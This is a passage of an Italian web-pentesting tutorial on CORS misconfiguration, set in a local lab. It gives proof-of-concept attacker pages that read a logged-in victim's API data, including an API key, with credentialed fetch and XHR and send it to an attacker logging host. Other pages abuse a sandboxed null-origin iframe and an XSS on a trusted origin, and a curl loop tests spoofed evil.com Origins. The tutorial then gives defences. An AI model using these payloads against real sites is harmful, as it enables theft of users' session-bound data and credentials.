```

```bash
# PoC pages: one per API mode, all read the API with the victim cookie
cd cors-lab/attacker/pages
for mode in none reflect prefix wildcard safe; do
cat > $mode.html <<EOF
<body>waiting</body>
<script>
// Read the API from the attacker origin, sending the victim cookie
fetch("http://127.0.0.1:8040/api/me/$mode", {credentials: "include"})
  .then((r) => r.json())
  .then((data) => {
    document.body.innerText = "READ: " + JSON.stringify(data);
    new Image().src = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(JSON.stringify(data));
  })
  .catch((err) => { document.body.innerText = "BLOCKED: " + err.message; });
</script>
EOF
done
cd ../../..
```

```bash
# Public wildcard page: no credentials are sent
cat > cors-lab/attacker/pages/public.html <<'EOF'
<body>waiting</body>
<script>
// Without credentials the wildcard origin works, but no victim data is sent
fetch("http://127.0.0.1:8040/api/me/public")
  .then((r) => r.json())
  .then((data) => { document.body.innerText = "READ: " + JSON.stringify(data); })
  .catch((err) => { document.body.innerText = "BLOCKED: " + err.message; });
</script>
EOF
```

```bash
# XMLHttpRequest PoC and trusted-origin XSS PoC
cat > cors-lab/attacker/pages/xhr.html <<'EOF'
<body>waiting</body>
<script>
// XMLHttpRequest version of the PoC: read with the victim cookie, then send it out
var req = new XMLHttpRequest();
req.onload = function () {
  location = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(this.responseText);
};
req.open("get", "http://127.0.0.1:8040/api/me/reflect", true);
req.withCredentials = true;
req.send();
</script>
EOF
cat > cors-lab/attacker/pages/trusted-xss.html <<'EOF'
<body>waiting</body>
<script>
// The API trusts only 127.0.0.1:8042: run the attack from inside that origin through its XSS
var attack = '<script>fetch("http://127.0.0.1:8040/api/me/safe", {credentials: "include"})' +
  '.then((r) => r.json())' +
  '.then((d) => { new Image().src = "http://127.0.0.1:8041/log?d=" + encodeURIComponent(JSON.stringify(d)); });<\/script>';
location = "http://127.0.0.1:8042/search?q=" + encodeURIComponent(attack);
</script>
EOF
```

```bash
# Null origin page: a sandboxed srcdoc iframe runs with the null origin
cat > cors-lab/attacker/pages/null.html <<'EOF'
<body>waiting</body>
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('http://127.0.0.1:8040/api/me/null', {credentials: 'include'})
  .then((r) => r.json())
  .then((d) => { new Image().src = 'http://127.0.0.1:8041/log?d=' + encodeURIComponent(JSON.stringify(d)); });
</script>"></iframe>
EOF
```

```bash
# Preflight page: PUT with a custom header triggers an OPTIONS preflight
cat > cors-lab/attacker/pages/preflight.html <<'EOF'
<body>waiting</body>
<script>
const mode = new URLSearchParams(location.search).get("mode");
fetch("http://127.0.0.1:8040/api/transfer/" + mode, {method: "PUT", headers: {"X-Api-Token": "demo"}})
  .then((r) => r.json())
  .then((d) => { document.body.innerText = "PUT OK: " + JSON.stringify(d); })
  .catch((err) => { document.body.innerText = "BLOCKED: " + err.message; });
</script>
EOF
```

```bash
# Terminal 1: API on port 8040
python3 cors-lab/api/cors_api.py
```

```bash
# Terminal 2: attacker site on port 8041
python3 cors-lab/attacker/cors_attacker.py
```

```bash
# Terminal 3: trusted app on port 8042
python3 cors-lab/trusted/trusted_app.py
```

Nel browser, nella stessa finestra: fai il login come vittima con `http://127.0.0.1:8040/login`. Poi apri le pagine dell'attaccante una alla volta.

### Test 1: nessun header CORS (l'errore di Google)

Apri `http://127.0.0.1:8041/none.html`. La pagina mostra `BLOCKED: Failed to fetch` e nella Console compare l'errore `No 'Access-Control-Allow-Origin' header is present on the requested resource`. Il server ha ricevuto la richiesta, ma il browser non lascia leggere la risposta.

### Test 2: Origin Reflection

Apri `http://127.0.0.1:8041/reflect.html`. La pagina mostra `READ:` con i dati e nel Terminale 2 compare:

```text
STOLEN: {"user":"marco","email":"marco@example.test","api_key":"demo-key-0001"}
```

### Test 3: PoC con XMLHttpRequest

Apri `http://127.0.0.1:8041/xhr.html`. Stesso risultato del test 2, con `XMLHttpRequest` invece di `fetch`: nel Terminale 2 compare `STOLEN:` con i dati.

### Test 4: `*` con credenziali

Apri `http://127.0.0.1:8041/wildcard.html`. Risultato: `BLOCKED: Failed to fetch`. Il server manda `Access-Control-Allow-Origin: *` con `Access-Control-Allow-Credentials: true` e il browser rifiuta la combinazione.

### Test 5: `*` senza credenziali

Apri `http://127.0.0.1:8041/public.html`. Il `fetch` non manda il cookie, quindi la pagina legge solo la risposta pubblica:

```text
READ: {"error":"not logged in"}
```

Il wildcard funziona, ma non c'è nessun dato della vittima da rubare.

### Test 6: bypass dell'Origin (curl)

Esegui questo ciclo: prova sei `Origin` su cinque endpoint deboli.

```bash
# Try each Origin against each weak endpoint and print the ACAO header
for origin in https://app.example.test.evil.com https://evil-app.example.test https://evilapp.example.test https://appXexample.test http://app.example.test https://evil.example; do
  for mode in prefix contains suffix dot http; do
    reply=$(curl -s -D - -o /dev/null http://127.0.0.1:8040/api/me/$mode -H "Origin: $origin" | grep -i '^access-control-allow-origin' | tr -d '\r')
    printf '%-38s %-9s %s\n' "$origin" "$mode" "${reply:-no ACAO}"
  done
done
```

L'output è la matrice della sezione sul bypass: ogni controllo debole accetta una sola famiglia di `Origin`.

### Test 7: Null Origin con cookie Lax e con SameSite=None

Apri `http://127.0.0.1:8041/null.html`. Il Terminale 2 mostra:

```text
STOLEN: {"error":"not logged in"}
```

Il server accetta `null`, ma il cookie `SameSite=Lax` non parte dall'iframe sandbox. Ora cambia il login con la versione `SameSite=None; Secure` e riapri la pagina:

```text
http://127.0.0.1:8040/login-none
http://127.0.0.1:8041/null.html
```

Questa volta arriva:

```text
STOLEN: {"user":"marco","email":"marco@example.test","api_key":"demo-key-0001"}
```

### Test 8: preflight

Apri `http://127.0.0.1:8041/preflight.html?mode=none`. La pagina mostra `BLOCKED: Failed to fetch` e il Terminale 1 registra solo l'`OPTIONS`:

```text
PREFLIGHT /none Origin=http://127.0.0.1:8041 Method=PUT Headers=x-api-token
```

Poi apri `http://127.0.0.1:8041/preflight.html?mode=reflect`. Qui il preflight è permesso e il `PUT` viene eseguito:

```text
PREFLIGHT /reflect Origin=http://127.0.0.1:8041 Method=PUT Headers=x-api-token
PUT /reflect executed
```

### Test 9: la versione sicura

Apri `http://127.0.0.1:8041/safe.html`. Risultato: `BLOCKED: Failed to fetch`. L'`Origin` dell'attaccante non è nella allowlist, quindi il server non manda `Access-Control-Allow-Origin` e risponde con `Vary: Origin`.

### Test 10: XSS sull'origine fidata

Rimani loggato e apri `http://127.0.0.1:8041/trusted-xss.html`. La pagina ti manda su `http://127.0.0.1:8042/search?q=...`, l'unica origine che l'endpoint `/api/me/safe` considera fidata. Lo script iniettato gira lì dentro, quindi il controllo CORS passa. Nel Terminale 2:

```text
STOLEN: {"user":"marco","email":"marco@example.test","api_key":"demo-key-0001"}
```

Lo stesso endpoint che nel test 9 era bloccato per l'attaccante ora è leggibile: la allowlist era corretta, il difetto è la XSS sull'origine fidata.

## Conclusione

Una CORS misconfiguration è un errore piccolo con un impatto che dipende dai dati dell'endpoint e da come il browser invia il cookie. Testa sempre nel browser, non solo in Burp, e documenta le condizioni. Se difendi: usa una allowlist esatta di origini, non riflettere mai l'`Origin`, non accettare `null`, tieni `Vary: Origin` e `SameSite` sui cookie e non lasciare che CORS sostituisca CSRF, autenticazione e autorizzazione.

> Vuoi migliorare davvero nel **web pentesting**? Per approfondire metodologie, detection ed exploitation in ambienti autorizzati, trovi la [formazione 1:1 HackIta](/formazione). Se vuoi testare il tuo **sito web**, la tua **applicazione** o la tua **azienda**, puoi vedere i [servizi HackIta](/servizi). Se vuoi supportare il progetto e aiutare la crescita di HackIta, puoi farlo su [Supporta HackIta](/supporta).

*Disclaimer: usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato (art. 615-ter c.p.).*
